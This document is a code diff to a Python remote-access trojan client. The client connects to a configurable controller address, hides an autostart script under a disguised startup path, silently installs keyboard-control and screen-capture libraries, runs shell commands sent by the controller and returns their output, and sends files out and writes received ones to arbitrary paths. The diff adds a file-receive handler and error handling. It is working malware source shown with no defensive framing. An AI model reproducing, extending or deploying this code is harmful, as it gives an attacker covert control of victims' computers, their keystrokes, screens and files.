@@ -3,36 +3,41 @@ from subprocess import check_output, call
 from time import sleep
 from sys import exit
 from random import randint
-from os import getlogin, chdir
+from os import getlogin
 from os.path import exists
 import threading
-import pathlib
 
 try:
     import pynput
-    from pynput.keyboard import Controller, Key
+    import mss
+    import psutil
 except ModuleNotFoundError:
     call(["pip", "install", "pynput"], shell=True)
+    call(["pip", "install", "psutil"], shell=True)
+    call(["pip", "install", "mss"], shell=True)
 
 # change this to your ip and port:
-HOST = "10.0.0.5"
+HOST = "10.0.0.2"
 PORT = 420
 # -----------------------------------------
 BUFFER = 4096
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
+from pynput.keyboard import Controller, Key
+
 keyboard = Controller()
 
 # the script for autostart
 var = """import threading
 from subprocess import call
+import os
+path = (pathlib.Path(__file__).parent.absolute())
+chdir(path)
 def a0001(): call(["python", "C:\$SysStartup\pslib.pyw"], shell=True)
 a0001 = threading.Thread(target=a0001)
 a0001.start()
 
 """
-path = (pathlib.Path(__file__).parent.absolute())
-chdir(path)
 global client
 
 
@@ -73,6 +78,7 @@ def recvMsg():
 try:
     # processes the commands if sent
     def process(message):
+        message = message.replace("\\\\", "\\")
         ctype = message[0]
         # if console command is sent
         if ctype == "c":
@@ -91,11 +97,19 @@ try:
 
             # checks if the command neds an output to be sent
             if mode == "o":
-                sendMsg(comm())
+                try:
+                    sendMsg(comm())
+                except:
+                    sendMsg("error")
+                    recvMsg()
             else:
                 threads = threading.Thread(target=tComm)
-                threads.start()
-                recvMsg()
+                try:
+                    threads.start()
+                    recvMsg()
+                except:
+                    sendMsg("error")
+                    recvMsg()
         # accepts a sent file
         elif ctype == "f":
 
@@ -190,13 +204,35 @@ try:
                 with open(f"{path}", "rb") as file:
                     string = file.read(2048)
                     while string:
-                        sleep(0.1)
-                        client.send(string)
+                        client.sendall(string)
                         string = file.read(2048)
+                sleep(0.5)
                 client.send(b"done")
                 recvMsg()
             else:
                 client.send(b"err")
+        # receives bytes
+        elif ctype == "b":
+            end = message[2:]
+            name = f"a{randint(111, 999)}{end}"
+            client.send(str(len(name)).encode())
+            client.send(name.encode(FORMAT))
+            file = client.recv(2048)
+            while file:
+                with open(f"{name}", "ab") as up:
+                    up.write(file)
+                if file[-4:] != b"done":
+                    file = client.recv(2048)
+                else:
+                    print("awaiting path")
+                    path = client.recv(2048).decode()
+                    print(path)
+                    if exists(str(path)):
+                        print(f'move {name} {path}')
+                        call([f'move', name, f'{path}'], shell=True)
+                        sendMsg("succ")
+                    else:
+                        sendMsg("err")
         # installation procedure
         elif ctype == "x":
             # creates the needed folders
